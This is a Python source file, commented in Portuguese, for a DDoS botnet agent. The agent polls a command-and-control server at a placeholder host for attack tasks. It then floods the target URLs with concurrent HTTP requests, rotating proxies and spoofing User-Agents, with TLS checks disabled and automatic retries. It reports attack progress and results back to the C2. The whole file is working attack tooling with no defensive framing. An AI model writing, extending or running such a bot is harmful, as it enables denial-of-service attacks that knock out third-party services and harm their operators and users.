import asyncio
import aiohttp
import requests
import uuid
import random
import os
import json

# 1. CONSTANTES (Devem vir logo após os imports)
C2_URL = "http://c2-server:5000"
BOT_ID = f"bot-{uuid.uuid4().hex[:6]}"
PROXY_LIST = []
PROXY_INDEX = 0

# 2. FUNÇÕES DE SUPORTE (Devem vir antes de serem chamadas)

def load_proxies():
    """Carrega lista de proxies do arquivo JSON"""
    global PROXY_LIST
    try:
        if os.path.exists("/proxies.json"):
            with open("/proxies.json", "r") as f:
                PROXY_LIST = json.load(f)
                print(f"[+] {len(PROXY_LIST)} proxies carregados")
        else:
            PROXY_LIST = []
            print("[*] Nenhum arquivo de proxies encontrado, usando IP direto")
    except Exception as e:
        print(f"[!] Erro ao carregar proxies: {e}")
        PROXY_LIST = []

def get_next_proxy():
    """Pega o próximo proxy na ordem round-robin"""
    global PROXY_INDEX
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
    PROXY_INDEX += 1
    return proxy

async def send_log(message):
    """Envia logs de progresso para o C2"""
    try:
        # Usamos requests para o log de forma síncrona para simplificar
        requests.post(f"{C2_URL}/report_log", json={"bot_id": BOT_ID, "message": message}, timeout=2)
    except Exception:
        pass

async def attack_task(session, request_config, retry_count=0, max_retries=2):
    """Realiza uma requisição HTTP assíncrona com retry automático"""
    url = request_config.get("url")
    method = request_config.get("method", "GET").upper()
    body = request_config.get("body")

    if not url:
        return {"status": None, "error": "URL vazia", "proxy": None}

    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]),
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }

    custom_headers = request_config.get("headers")
    if custom_headers:
        headers.update(custom_headers)

    proxy = get_next_proxy()

    try:
        timeout_val = aiohttp.ClientTimeout(total=10, connect=3, sock_read=5)
        if method == "POST":
            async with session.post(url, headers=headers, data=body, timeout=timeout_val) as response:
                return {"status": response.status, "error": None, "proxy": proxy}
        elif method == "PUT":
            async with session.put(url, headers=headers, data=body, timeout=timeout_val) as response:
                return {"status": response.status, "error": None, "proxy": proxy}
        else:
            async with session.get(url, headers=headers, timeout=timeout_val) as response:
                return {"status": response.status, "error": None, "proxy": proxy}
    except asyncio.TimeoutError as e:
        if retry_count < max_retries:
            await asyncio.sleep(0.2 * (retry_count + 1))
            return await attack_task(session, request_config, retry_count + 1, max_retries)
        return {"status": None, "error": f"Timeout (tentativa {retry_count + 1})", "proxy": proxy}
    except Exception as e:
        if retry_count < max_retries and not isinstance(e, (aiohttp.ClientSSLError, aiohttp.InvalidURL)):
            await asyncio.sleep(0.2 * (retry_count + 1))
            return await attack_task(session, request_config, retry_count + 1, max_retries)
        error_msg = f"{type(e).__name__}"
        return {"status": None, "error": error_msg, "proxy": proxy}

async def flood_target(requests_list, intensity, attack_id):
    """Gerencia o lote de requisições assíncronas com múltiplas URLs/payloads"""
    await send_log(f"INICIANDO ATAQUE (ID: {attack_id}) com {len(requests_list)} requisicao(oes) - Intensidade: {intensity}")

    try:
        import ssl
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        connector = aiohttp.TCPConnector(limit=None, ssl=ssl_context, force_close=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            requests_successful = 0
            requests_failed = 0
            total_sent = 0
            error_counts = {}

            for round_num in range(intensity):
                tasks = []
                for req_config in requests_list:
                    tasks.append(asyncio.create_task(attack_task(session, req_config)))

                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for result in results:
                        total_sent += 1
                        if isinstance(result, dict):
                            status = result.get("status")
                            error = result.get("error")

                            if status and 200 <= status < 400:
                                requests_successful += 1
                            else:
                                requests_failed += 1
                                if error:
                                    error_counts[error] = error_counts.get(error, 0) + 1
                        else:
                            requests_failed += 1

                if round_num % 10 == 0 and round_num > 0:
                    await send_log(f"PROGRESSO: {total_sent}/{len(requests_list) * intensity} | Sucesso: {requests_successful} | Falhas: {requests_failed}")
                    try:
                        requests.post(
                            f"{C2_URL}/report_attack_status",
                            json={
                                "attack_id": attack_id,
                                "requests_sent": total_sent,
                                "requests_successful": requests_successful,
                                "requests_failed": requests_failed
                            },
                            timeout=2
                        )
                    except Exception:
                        pass

            total_requests = len(requests_list) * intensity

            if error_counts:
                top_errors = sorted(error_counts.items(), key=lambda x: x[1], reverse=True)[:3]
                error_msg = " | ".join([f"{err}: {count}" for err, count in top_errors])
                await send_log(f"ERROS PRINCIPAIS: {error_msg}")

            pct_sucesso = (requests_successful / total_requests * 100) if total_requests > 0 else 0
            await send_log(f"ATAQUE CONCLUIDO (ID: {attack_id}) | Total: {total_requests} | Sucesso: {requests_successful} ({pct_sucesso:.1f}%) | Falhas: {requests_failed}")

            return {
                "attack_id": attack_id,
                "requests_successful": requests_successful,
                "requests_failed": requests_failed,
                "total_requests": total_requests,
                "error_distribution": error_counts
            }
    except Exception as e:
        await send_log(f"ERRO NO ATAQUE (ID: {attack_id}): {str(e)}")
        return {
            "attack_id": attack_id,
            "requests_successful": 0,
            "requests_failed": 0,
            "total_requests": 0,
            "error_distribution": {}
        }

# 3. LÓGICA PRINCIPAL (O loop de vida do bot)

async def main():
    load_proxies()
    print(f"[*] Agente {BOT_ID} online e aguardando ordens...")

    while True:
        try:
            response = requests.get(f"{C2_URL}/get_task/{BOT_ID}", timeout=5)

            if response.status_code == 200:
                task_data = response.json().get("task")

                if task_data and isinstance(task_data, dict):
                    requests_list = task_data.get("requests", [])
                    intensity = task_data.get("intensity", 10)
                    attack_id = task_data.get("attack_id")

                    if requests_list:
                        print(f"[*] Recebido ataque {attack_id} com {len(requests_list)} URLs")
                        result = await flood_target(requests_list, intensity, attack_id)

                        try:
                            requests.post(
                                f"{C2_URL}/report_attack_status",
                                json={
                                    "attack_id": attack_id,
                                    "requests_sent": result["total_requests"],
                                    "requests_successful": result["requests_successful"],
                                    "requests_failed": result["requests_failed"],
                                    "error_distribution": result.get("error_distribution", {})
                                },
                                timeout=2
                            )
                            requests.post(
                                f"{C2_URL}/finish_attack",
                                json={"attack_id": attack_id},
                                timeout=2
                            )
                        except Exception as e:
                            print(f"[!] Erro ao reportar: {e}")

                    await asyncio.sleep(0.1)
                else:
                    await asyncio.sleep(3)
            else:
                await asyncio.sleep(3)
        except Exception as e:
            print(f"[!] Erro main: {e}")
            await asyncio.sleep(2)


# 4. PONTO DE ENTRADA DO SCRIPT
if __name__ == "__main__":
    asyncio.run(main())